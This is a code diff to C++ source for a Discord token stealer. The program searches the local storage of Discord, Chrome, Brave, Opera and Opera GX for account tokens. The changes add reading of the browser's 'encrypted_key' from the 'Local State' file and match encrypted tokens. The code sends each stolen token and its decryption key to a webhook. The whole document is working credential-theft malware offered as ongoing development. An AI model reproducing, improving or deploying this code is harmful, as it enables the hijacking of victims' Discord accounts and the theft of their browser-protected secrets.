@@ -89,11 +89,11 @@ std::vector<std::string> find_paths() {
 	size_t roamingLen;
 	_dupenv_s(&roaming, &roamingLen, "APPDATA");
 
-	std::string discordPath = std::string(roaming) + "\\discord\\Local Storage";
-	std::string bravePath = std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage";
-	std::string operaPath = std::string(roaming) + "\\Opera Software\\Opera Stable\\Default\\Local Storage";
-	std::string chromePath = std::string(local) + "\\Google\\Chrome\\User Data\\Default\\Local Storage";
-	std::string operaGXPath = std::string(roaming) + "\\Opera Software\\Opera GX Stable\\Local Storage";
+	std::string discordPath = std::string(roaming) + "\\discord";
+	std::string bravePath = std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
+	std::string operaPath = std::string(roaming) + "\\Opera Software\\Opera Stable\\Default";
+	std::string chromePath = std::string(local) + "\\Google\\Chrome\\User Data\\Default";
+	std::string operaGXPath = std::string(roaming) + "\\Opera Software\\Opera GX Stable";
 
 	targets.push_back(discordPath);
 	targets.push_back(bravePath);
@@ -107,7 +107,7 @@ std::vector<std::string> find_paths() {
 	return targets;
 }
 
-void search_token(const std::string& target, const std::string& path) {
+void search_token(const std::string& target, const std::string& path, const std::string& key) {
 	std::ifstream ifs(path, std::ios_base::binary);
 	if (!ifs.is_open()) {
 		SetConsoleColor(LIGHT_RED_COLOR);
@@ -120,7 +120,7 @@ void search_token(const std::string& target, const std::string& path) {
 	ifs.close();
 
 	std::regex reg1(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
-	std::regex reg2(R"(mfa\.[\w-]{84})");
+	std::regex reg2(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");
 
 	std::vector<std::string> data;
 
@@ -140,29 +140,81 @@ void search_token(const std::string& target, const std::string& path) {
 		std::cout << "[!] Sending token found on path: " << target << std::endl;
 		SetConsoleColor(RESET_COLOR);
 
-		send_webhook_data(token, "A new token has been logged in", 8105471);
+		std::string data = R"(**Token: **)" + token + R"(\n**Key**: )" + key;
+
+		send_webhook_data(data, "A new token has been logged in", 8105471);
 	}
 }
 
+std::string extract_value(const std::string& json, const std::string& key) {
+	std::string search_key = "\"" + key + "\"";
+	size_t key_pos = json.find(search_key);
+	if (key_pos == std::string::npos) return "";
+
+	size_t start_pos = json.find(':', key_pos) + 1;
+	size_t end_pos = json.find(',', start_pos);
+	if (end_pos == std::string::npos) {
+		end_pos = json.find('}', start_pos);
+	}
+
+	std::string value = json.substr(start_pos, end_pos - start_pos);
+
+	size_t start = value.find_first_not_of(" \t\n\r\" ");
+	size_t end = value.find_last_not_of(" \t\n\r\" ");
+	if (start != std::string::npos && end != std::string::npos) {
+		value = value.substr(start, end - start + 1);
+	}
+
+	return value;
+}
+
+std::string trim_ending_characters(const std::string& str, const std::string& chars_to_remove) {
+	std::string result = str;
+	size_t end_pos = result.find_last_not_of(chars_to_remove);
+
+	if (end_pos != std::string::npos) {
+		result.erase(end_pos + 1);
+	}
+
+	return result;
+}
+
 void find_token(const std::string& path) {
-	std::string target = path + "\\leveldb";
+	std::string target = path + "\\Local Storage\\leveldb";
+	std::string keyPath = path + "\\Local State";
 
 	try {
+		std::ifstream keyFile(keyPath);
+		std::string key;
+
+		if (keyFile.is_open()) {
+			std::string content;
+
+			content.assign((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());
+
+			keyFile.close();
+
+			key = extract_value(content, "encrypted_key");
+			key = trim_ending_characters(key, "}\"");
+		}
+
+		std::cout << key << std::endl;
+
 		for (const auto& entry : std::filesystem::directory_iterator(target)) {
 			std::string strPath = entry.path().u8string();
 
 			if (has_extension(strPath, ".log")) {
-				search_token(target, strPath);
+				search_token(target, strPath, key);
 			}
 
 			if (has_extension(strPath, ".ldb")) {
-				search_token(target, strPath);
+				search_token(target, strPath, key);
 			}
 		}
 	}
 	catch (const std::exception& err) {
 		SetConsoleColor(LIGHT_RED_COLOR);
-		std::cout << "Error trying to get tokens on path: " << path << std::endl;
+		std::cout << "Error trying to get tokens on path: " << path << ", " << err.what() << std::endl;
 		SetConsoleColor(RESET_COLOR);
 	}
 }
